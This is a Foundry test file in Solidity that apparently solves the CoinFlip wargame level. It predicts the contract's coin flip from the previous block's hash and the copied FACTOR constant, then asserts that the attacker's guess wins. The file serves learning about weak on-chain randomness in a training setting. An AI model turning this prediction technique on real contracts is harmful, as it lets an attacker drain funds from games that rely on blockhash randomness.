// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/CoinFlip.sol";


contract CoinFlipTest is Test{
    CoinFlip coinflip;

    address attacker = mkaddr("attacker");

    function setUp() public{
        coinflip = new CoinFlip();
    }
      
    function testHackCoinFlip() public {
        vm.startPrank(attacker);
        //copy factor from coinflip
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        assertEq(coinflip.flip(side), true );
        vm.stopPrank();

    }


    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}